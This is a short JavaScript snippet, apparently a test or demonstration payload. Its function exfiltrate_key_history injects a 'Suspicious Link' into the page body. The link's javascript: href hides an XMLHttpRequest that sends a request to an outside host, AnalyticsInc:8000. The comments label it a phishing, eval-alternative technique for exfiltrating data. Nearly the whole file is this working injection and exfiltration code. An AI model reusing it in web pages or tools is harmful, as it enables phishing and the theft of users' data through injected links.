function exfiltrate_key_history() {

    // Phishing - Hyperlink - Eval Alternative 
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link", true);xmlhttp.send(null);';
	var link = document.createElement("a");
	link.href = 'javascript:' + exp;
	link.innerHTML = 'Suspicious Link';
    link.id = 'mylink';
	document.getElementsByTagName('body')[0].appendChild(link);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
